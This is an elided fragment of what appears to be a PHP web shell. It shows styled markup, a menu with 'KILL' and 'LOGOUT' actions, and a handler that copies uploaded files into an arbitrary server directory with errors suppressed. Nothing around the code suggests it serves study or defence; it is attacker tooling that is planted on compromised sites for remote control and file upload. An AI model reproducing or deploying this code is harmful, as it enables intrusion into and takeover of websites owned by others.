...
<head>
	...
	.mybox{
		...
		border-radius: 10px;
		border:1px solid cyan; padding:4px 2px;
		width:70%;
		line-height:24px;
		background:none;
...
echo "<br>";
echo "&nbsp;<a href='?' style='border:2px solid cyan;width:80px;padding:0px 8px 0px 8px;'>H O M E</a>&nbsp;<a href='?shell&do=kill' style='border:2px solid cyan;width:80px;padding:0px 8px 0px 8px;'>K I L L </a>&nbsp;<a href='?byee&do=logout' style='color:red;border:2px solid cyan;width:80px;padding:0px 8px 0px 8px;'>L O G O U T</a>";
echo "</td></table>";
echo "<div id='menu'>";
echo "<hr>";
echo "<center>";
	...
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=cyan>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
